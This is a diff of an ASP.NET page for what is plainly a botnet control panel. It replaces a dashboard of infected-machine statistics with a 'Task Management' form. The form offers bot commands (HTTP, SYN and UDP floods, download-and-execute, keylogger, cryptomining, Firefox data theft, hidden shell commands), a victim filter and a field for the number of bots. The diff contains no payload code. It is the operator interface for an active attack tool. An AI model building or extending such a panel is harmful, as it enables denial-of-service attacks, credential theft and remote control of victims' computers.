@@ -1,4 +1,4 @@
-﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Dashboard.aspx.cs" Inherits="Home" %>
+﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Tasks.aspx.cs" Inherits="Tasks" %>
 
 <!DOCTYPE html>
 
@@ -51,10 +51,18 @@
       });
     })
   </script>
+    <style type="text/css">
+        .auto-style1 {
+            width: 100%;
+        }
+        .auto-style2 {
+            width: 163px;
+        }
+    </style>
 </head>
 
 <body class="Dashboard">
-    <form id="form1" runat="server">
+    <form id="form2" runat="server">
         <div class="Sidebar">
             <ul>
                 <li>
@@ -138,7 +146,7 @@
                     </li>
                     <li>/</li>
                     <li>
-                        <a href="<%//TODO: Add a destenation%>">Tasks Management</a>
+                        <a href="Tasks.aspx">Tasks Management</a>
                     </li>
                     <li>/</li>
                     <li>
@@ -185,86 +193,72 @@
                 <asp:Label ID="lblConnectionsTotalText" runat="server" Text="TOTAL CONNECTIONS"></asp:Label>
             </div>
         </div>
+        <hr class="SecondLine"/>
 
-       <hr class="SecondLine"/>
-
-        <div class="Charts">
-            <div class="CountryMap">
-                <div class="CountryMapName">
-                    <ul>
-                        <li>COUNTRY MAP</li>
-                    </ul>
-                </div>
-                <div class="CountryMapChart">
-                      <div id="map1" style="width: 795px; height: 440px"></div>
-                </div>
+        <div class="Tasks">
+            <div class="TaskName">
+                <ul>
+                    <li>TASK MANAGEMENT</li>
+                </ul>
             </div>
-
-            <div class="CountryChart">
-                <div class="CountryChartName">
-                    <ul>
-                        <li>COUNTRY CHART</li>
-                    </ul>
-                </div>
-                <div class="CountryChartGraph">
-                    <% //TODO: Pie Chart for Countrys %>
-                </div>
-            </div>
-
-            <div class="OSChart">
-                <div class="OSChartName">
-                    <ul>
-                        <li>OPERATING SYSTEM CHART</li>
-                    </ul>
-                </div>
-                <div class="OSChartGraph">
-                    <% //TODO: BarGraph with OS's %>
-                </div>
-            </div>
-        </div>
-
-        <div class="CountGrid">
-            <div class="CountryCount">
-                <div class="CountryCountName">
-                    <ul>
-                        <li>COUNTRY COUNT</li>
-                    </ul>
-                </div>
-                <div class="CountryCountGraph">
-                    <div class="Grid">
-                        <asp:GridView ID="grdCountry" runat="server" onrowdatabound="grdCountry_RowDataBound">
-                        </asp:GridView>
-                    </div>
-                </div>
-            </div>
-
-            <div class="OSCount">
-                <div class="OSCountName">
-                    <ul>
-                        <li>OPERATING SYSTEM COUNT</li>
-                    </ul>
-                </div>
-                <div class="OSCountGraph">
-                    <div class="Grid">
-                        <asp:GridView cssClass="grdOS" ID="grdOS" runat="server" onrowdatabound="grdOS_RowDataBound">
-                        </asp:GridView>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="OnlineNowGrid">
-            <div class="OnlineNow">
-                <div class="OnlineNowName">
-                    <ul>
-                        <li>ONLINE NOW</li>
-                    </ul>
-                </div>
-                <div class="OnlineNowGraph">
-                    <div class="Grid">
-                        <asp:GridView ID="grdOnline" runat="server" onrowdatabound="grdOnline_RowDataBound">
-                        </asp:GridView>
-                    </div>
+            <div class="TasksGrid">
+                <div class="Grid">
+                    <br />
+                    <table class="auto-style1">
+                        <tr>
+                            <td class="auto-style2">
+                    <asp:Label ID="lblDropdown" runat="server" Text="Task"></asp:Label>
+                            </td>
+                            <td>
+                    <asp:DropDownList ID="DropDownList1" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid">
+                        <asp:ListItem Value="0" disabled selected hidden >Nothing selected</asp:ListItem>
+                        <asp:ListItem Value="clipboard">Clipboard Manager</asp:ListItem>
+                        <asp:ListItem Value="http">HTTP Flood</asp:ListItem>
+                        <asp:ListItem Value="syn">SYN Flood</asp:ListItem>
+                        <asp:ListItem Value="udp">UDP Flood</asp:ListItem>
+                        <asp:ListItem Value="download">Download and Execute</asp:ListItem>
+                        <asp:ListItem Value="firefox">FireFox Backup</asp:ListItem>
+                        <asp:ListItem Value="homepage">Change Homepage</asp:ListItem>
+                        <asp:ListItem Value="keylogger">Active Keylogger</asp:ListItem>
+                        <asp:ListItem Value="mine">Mine</asp:ListItem>
+                        <asp:ListItem Value="cleanse">System Cleanse</asp:ListItem>
+                        <asp:ListItem Value="update">Update</asp:ListItem>
+                        <asp:ListItem Value="uninstall">Uninstall</asp:ListItem>
+                        <asp:ListItem Value="viewhidden">View Website (Hidden)</asp:ListItem>
+                        <asp:ListItem Value="viewvisable">View Website (Visible)</asp:ListItem>
+                        <asp:ListItem Value="shellvisable">Shell Command (Hidden)</asp:ListItem>
+                        <asp:ListItem>Shell Command (Visible)</asp:ListItem>
+                    </asp:DropDownList>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="auto-style2">
+                    <asp:Label ID="lblFilter" runat="server" Text="Filter"></asp:Label>
+                            </td>
+                            <td>
+                    <asp:TextBox ID="txtFilter" runat="server" placeholder="Example: US, 127.0.0.1, BFEBFBFF000306C3"></asp:TextBox>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="auto-style2">
+                    <asp:Label ID="lblAmount" runat="server" Text="Amount"></asp:Label>
+                            </td>
+                            <td>
+                    <asp:TextBox ID="txtAmount" runat="server" placeholder="Amount of bots to run Task"></asp:TextBox>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="auto-style2">&nbsp;</td>
+                            <td>
+                    <asp:Button ID="Button1" runat="server" Text="Button" />
+                            </td>
+                        </tr>
+                    </table>
+                    <br />
+                    <br />
+                    <br />
+                   <asp:GridView cssClass="grdTask" ID="grdTask" runat="server">
+                   </asp:GridView>
                 </div>
             </div>
         </div>
